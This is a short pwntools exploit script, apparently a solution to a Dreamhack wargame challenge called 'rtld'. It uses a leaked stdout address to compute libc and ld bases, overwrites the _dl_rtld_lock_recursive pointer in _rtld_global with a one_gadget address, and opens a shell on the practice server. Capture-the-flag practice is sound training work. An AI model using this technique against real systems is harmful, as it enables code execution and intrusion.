#! /usr/bin/python3
from pwn import *
# p = process('./rtld')
p = remote("host3.dreamhack.games", 16869)
e = ELF('./rtld')
libc = ELF('./libc-2.23.so')
ld = ELF('./ld-2.23.so')

# #pie_base = p.libs()["./rtld"]

p.recvuntil(b':')
stdout = int(p.recvuntil(b'\n'), 16)

libc_base = stdout - libc.symbols['_IO_2_1_stdout_']
ld_base = libc_base + 0x3ca000

rtld_global = ld_base + ld.symbols['_rtld_global']
dl_rtld_lock_recursive = rtld_global + 3848

print('lock_recursive ...', hex(dl_rtld_lock_recursive))

# #get_shell = e.symbols['get_shell']+pie_base
one_gadget = libc_base + 0xf1247
p.sendlineafter(b"addr: ",str(dl_rtld_lock_recursive).encode())
p.sendlineafter(b"value: ", str(one_gadget).encode())

p.interactive()
